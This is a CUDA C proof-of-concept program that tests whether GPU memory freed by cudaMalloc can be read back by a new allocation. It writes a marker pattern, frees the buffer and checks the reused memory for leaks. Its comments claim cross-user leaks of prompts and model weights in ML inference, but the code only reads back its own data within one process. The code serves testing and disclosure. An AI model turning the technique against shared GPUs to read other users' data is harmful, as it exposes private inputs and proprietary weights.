#include <cuda_runtime.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/*
 * CUDA Uninitialized Memory Read PoC
 *
 * cudaMalloc() does NOT zero-initialize GPU memory.
 * If a previous allocation held sensitive data (model weights,
 * input tokens, activation values), a subsequent allocation
 * at the same address can read that data without any explicit copy.
 *
 * Real-world impact in ML inference:
 *   - Input prompt tokens from user A can leak into user B's allocation
 *   - Model weights or KV-cache entries can persist across requests
 *   - LoRA adapter weights can bleed into base model buffers
 */

#define CHECK(call)                                                      \
    do {                                                                 \
        cudaError_t err = (call);                                        \
        if (err != cudaSuccess) {                                        \
            fprintf(stderr, "CUDA error %s:%d: %s\n",                   \
                    __FILE__, __LINE__, cudaGetErrorString(err));        \
            exit(1);                                                     \
        }                                                                \
    } while (0)

/* Write a recognizable pattern into GPU buffer */
__global__ void write_secret(uint32_t *buf, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n) {
        /* Non-wrapping 32-bit magic — never equals 0, no false positives */
        buf[i] = 0xDEAD0000u + (uint32_t)i;
    }
}

/* Read whatever is in the buffer without writing first */
__global__ void read_uninitialized(uint32_t *buf, uint32_t *out, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n)
        out[i] = buf[i];
}

int main() {
    const int N = 1024;  /* 32-bit words = 4 KB */
    uint32_t *d_secret = NULL;
    uint32_t *d_new    = NULL;
    uint32_t  h_result[N];

    printf("=== CUDA Uninitialized Memory Read PoC ===\n\n");

    /* Step 1: Allocate buffer, write secret data, then free */
    printf("[1] Allocating %d words (%zu bytes), writing 0xDEAD0000+i pattern...\n",
           N, N * sizeof(uint32_t));
    CHECK(cudaMalloc(&d_secret, N * sizeof(uint32_t)));
    write_secret<<<(N+255)/256, 256>>>(d_secret, N);
    CHECK(cudaDeviceSynchronize());
    CHECK(cudaFree(d_secret));
    printf("    Secret written and buffer freed.\n\n");

    /* Step 2: Allocate a NEW buffer — same size, likely same address */
    printf("[2] Allocating new buffer (no initialization)...\n");
    CHECK(cudaMalloc(&d_new, N * sizeof(uint32_t)));
    printf("    Old ptr: %p\n", (void*)d_secret);
    printf("    New ptr: %p\n", (void*)d_new);

    uint32_t *d_out;
    CHECK(cudaMalloc(&d_out, N * sizeof(uint32_t)));

    /* Step 3: Read from new buffer without writing to it */
    read_uninitialized<<<(N+255)/256, 256>>>(d_new, d_out, N);
    CHECK(cudaDeviceSynchronize());
    CHECK(cudaMemcpy(h_result, d_out, N * sizeof(uint32_t),
                     cudaMemcpyDeviceToHost));

    /* Step 4: Non-zero pattern check — 0xDEAD0000+i never equals 0
     * so zeroed memory produces 0 false positives */
    int matches  = 0;
    int non_zero = 0;
    for (int i = 0; i < N; i++) {
        uint32_t expected = 0xDEAD0000u + (uint32_t)i;
        if (h_result[i] == expected) matches++;
        if (h_result[i] != 0)        non_zero++;
    }

    printf("\n[3] Results:\n");
    printf("    Words read:                  %d\n", N);
    printf("    Non-zero words:              %d / %d\n", non_zero, N);
    printf("    Matching secret pattern:     %d / %d (%.2f%%)\n",
           matches, N, 100.0 * matches / N);

    if (matches == N) {
        printf("\n[!] FULL LEAK: cudaMalloc returned unzeroed memory.\n");
    } else if (matches > 0) {
        printf("\n[~] PARTIAL LEAK: %d words match secret pattern.\n", matches);
    } else if (non_zero == 0) {
        printf("\n[SAFE] Driver zeroed memory on cudaMalloc.\n");
    } else {
        printf("\n[INFO] Memory not zeroed but secret not found.\n");
        printf("    First 4 words: 0x%08x 0x%08x 0x%08x 0x%08x\n",
               h_result[0], h_result[1], h_result[2], h_result[3]);
    }

    CHECK(cudaFree(d_new));
    CHECK(cudaFree(d_out));
    return 0;
}
